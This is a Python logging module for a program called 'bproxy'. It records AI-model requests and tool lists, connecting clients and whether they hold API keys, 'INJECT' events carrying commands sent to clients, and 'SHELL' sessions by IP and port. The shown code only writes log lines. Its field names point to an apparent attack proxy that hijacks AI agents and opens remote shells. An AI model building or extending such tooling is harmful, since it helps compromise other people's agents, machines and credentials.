import os
import threading
from datetime import datetime

_lock    = threading.Lock()
_logfile = None


def init(path: str = "/tmp/bproxy.log"):
    global _logfile
    _logfile = path
    with open(path, "a") as f:
        f.write(f"\n{'='*60}\n")
        f.write(f"[{_ts()}] bproxy started\n")
        f.write(f"{'='*60}\n")


def _ts() -> str:
    return datetime.now().strftime("%H:%M:%S")


def log(msg: str):
    if _logfile is None:
        return
    with _lock:
        with open(_logfile, "a") as f:
            f.write(f"[{_ts()}] {msg}\n")


def log_request(ip: str, path: str, model: str, tools: list, kind: str, extra: str = ""):
    tool_names = ", ".join(t.get("name", "?") for t in tools) if tools else "none"
    line = f"REQ  {ip:>15}  {path:<30}  model={model}  tools=[{tool_names}]  → {kind}"
    if extra:
        line += f"  ({extra})"
    log(line)


def log_client(cid: str, ip: str, agent: str, version: str, has_key: bool, model: str):
    key_s = "key:yes" if has_key else "key:no"
    ver_s = f" v{version}" if version else ""
    log(f"NEW CLIENT  #{cid}  {ip}  {agent}{ver_s}  {key_s}  model={model}")


def log_inject(cid: str, cmd: str):
    log(f"INJECT  client=#{cid}  cmd={cmd!r}")


def log_shell(sid: str, ip: str, port: int, event: str):
    log(f"SHELL   #{sid}  {ip}:{port}  {event}")
